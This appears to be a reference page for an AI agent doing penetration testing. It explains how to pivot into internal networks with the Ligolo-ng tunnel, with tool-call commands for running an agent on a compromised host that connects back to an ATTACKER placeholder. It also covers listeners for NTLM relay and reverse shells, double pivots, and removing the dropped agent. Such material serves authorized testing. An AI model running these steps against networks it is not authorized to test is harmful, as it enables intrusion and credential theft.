### Ref: Ligolo-ng

**Root pattern:** Ligolo-ng creates a TLS-encrypted tunnel between a **proxy** (attacker side) and an **agent** (pivot side), then exposes the pivot's network as a Layer-3 TUN interface on the attacker. Once the TUN is up and a route is added, *any* tool on the attacker can reach the internal segment as if directly connected — including ICMP, UDP, raw sockets, and protocols that proxychains can't carry. There is no SOCKS proxy in the middle, no proxychains overhead, and no per-connection latency. This makes it the right choice for full nmap sweeps (including UDP and OS detection), SMB/NFS/RDP, and any tool that bakes in raw socket assumptions.

**When to use:**
- Need ICMP (ping sweeps, traceroute) into the internal network
- Need full UDP (NFS, SNMP, DNS lookups against an internal resolver, UDP nmap)
- Need protocols proxychains mangles or breaks (some Kerberos flows, NFSv4, SMB1 quirks)
- Want native tool speed — no per-call SOCKS overhead

**When NOT to use:**
- Egress is HTTP-only (ligolo-ng's default 11601/tcp is obviously not web traffic — even with `-laddr :443` the protocol is non-HTTP and a deep-inspection proxy will reject it). Use chisel instead
- You only need a single TCP port — `ssh -L` or chisel single-port forward is lighter
- The pivot architecture isn't on the ligolo-ng release page (rare; check https://github.com/nicocha30/ligolo-ng/releases)

---

**Step 1 — One-time TUN interface + route on the attacker** (idempotent — safe to re-run):
```
Bash("ip tuntap add user $(whoami) mode tun ligolo 2>/dev/null; ip link set ligolo up")
Bash("ip route add TARGET_NET/CIDR dev ligolo 2>/dev/null; ip route show dev ligolo")
```
The interface name `ligolo` is conventional but anything works — the `--tun` flag in step 4 must match.

**Step 2 — Start the proxy in tmux** (stays alive across `Bash` calls):
```
Bash("tmux new-session -d -s ligolo 'ligolo-proxy -selfcert -laddr 0.0.0.0:11601'")
Bash("sleep 1 && tmux capture-pane -t ligolo -p | tail -20")
```

**Step 3 — Drop and run the agent on the pivot** (via your access channel — see `refs/payload-delivery.md`):
```
# Pick the right release: agent_Linux_amd64, agent_Linux_arm64, agent_Windows_amd64.exe, …
chmod +x /tmp/agent
/tmp/agent -connect ATTACKER:11601 -ignore-cert &
```

`-ignore-cert` accepts the proxy's self-signed cert (paired with `-selfcert` in step 2). For real opsec, ship a real cert + drop `-selfcert`/`-ignore-cert`.

**Step 4 — Inside the proxy console (driven via tmux), select the session and start routing:**
```
Bash("tmux send-keys -t ligolo 'session' Enter")
Bash("sleep 1 && tmux capture-pane -t ligolo -p | tail -10")    # see session list
Bash("tmux send-keys -t ligolo '1' Enter")                       # pick session 1
Bash("tmux send-keys -t ligolo 'start --tun ligolo' Enter")
Bash("sleep 1 && tmux capture-pane -t ligolo -p | tail -10")
```

**Step 5 — Verify L3 reachability** — no proxychains, native tools:
```
Bash("ping -c 2 -W 2 INTERNAL_HOST")
Bash("nmap -sT -Pn --top-ports 100 INTERNAL_HOST")
Bash("nmap -sU --top-ports 50 INTERNAL_HOST")    # UDP works — proxychains can't do this
```

---

**Listening on the pivot's network from the attacker** (`listener_add`)

When you need an internal host to call back to *you* through the pivot — e.g., a coerced SMB auth, an NTLM relay, a reverse shell from a deeper host — the pivot needs to expose an attacker-side listener on its own internal interface:

```
# In the proxy console (via tmux):
listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp
# Now any internal host that hits PIVOT_INTERNAL_IP:445 gets routed to attacker:445
```

Pair with Responder/ntlmrelayx running on the attacker on the same port. List or remove with `listener_list` / `listener_del`.

---

**Double-pivot** (attacker → pivot1 → pivot2 → deeper net):

1. First ligolo session as above — pivot1 connected to attacker, TUN up for pivot1's network.
2. From pivot1 (reachable through the TUN), drop a *second* agent on pivot2 in the deeper network.
3. The second agent connects back to pivot1 (not the attacker) on a port that pivot1 forwards via `listener_add`:
```
# In proxy console: forward attacker:11602 to a port on pivot1 that pivot2 can reach
listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11602 --tcp
# On pivot2:
/tmp/agent -connect PIVOT1_INTERNAL:11602 -ignore-cert &
# In proxy console — new session appears, select it, start with a different TUN:
session
2
start --tun ligolo2
```
4. Add the deeper net route to the new TUN: `ip route add DEEPER_NET/CIDR dev ligolo2`.

Result: full L3 to two independent internal segments.

---

**Common flags reference:**

| Side | Flag | Purpose |
|------|------|---------|
| proxy | `-laddr ADDR:PORT` | Bind address (default `0.0.0.0:11601`) |
| proxy | `-selfcert` | Generate a self-signed cert at startup |
| proxy | `-certfile FILE` / `-keyfile FILE` | Use a real cert instead of `-selfcert` |
| proxy | `-allow-domains LIST` | Restrict which CNs the agent cert can present (real-cert hardening) |
| agent | `-connect HOST:PORT` | Where to call back to (the proxy's `-laddr`) |
| agent | `-ignore-cert` | Accept the proxy's self-signed cert |
| agent | `-retry` | Reconnect indefinitely if the tunnel drops |
| agent | `-bind ADDR:PORT` | Inverse mode — the agent listens, the proxy connects (rare; for when the pivot has inbound but no outbound) |

**Console commands** (driven via `tmux send-keys`):

| Command | Purpose |
|---------|---------|
| `session` | List connected agents and prompt for selection |
| `start --tun NAME` | Begin routing on the named TUN interface |
| `stop` | Stop routing on the current session |
| `listener_add --addr A --to B --tcp` | Forward attacker `A` to internal `B` via the pivot |
| `listener_list` | Show active listeners |
| `listener_del ID` | Remove a listener |
| `ifconfig` | Show the agent's network interfaces (run inside the session — confirms reachable nets before adding routes) |
| `exit` | Close the proxy console |

---

**Cleanup checklist:**
```
# In the proxy console:
Bash("tmux send-keys -t ligolo 'stop' Enter")
Bash("tmux send-keys -t ligolo 'exit' Enter")

# Tear down tmux + TUN + route:
Bash("tmux kill-session -t ligolo 2>/dev/null")
Bash("ip route del TARGET_NET/CIDR dev ligolo 2>/dev/null")
Bash("ip link set ligolo down 2>/dev/null && ip tuntap del mode tun ligolo 2>/dev/null")

# On the pivot (via access channel):
pkill -f /tmp/agent
rm -f /tmp/agent
```

Append a `note` event for each cleanup step with the result.
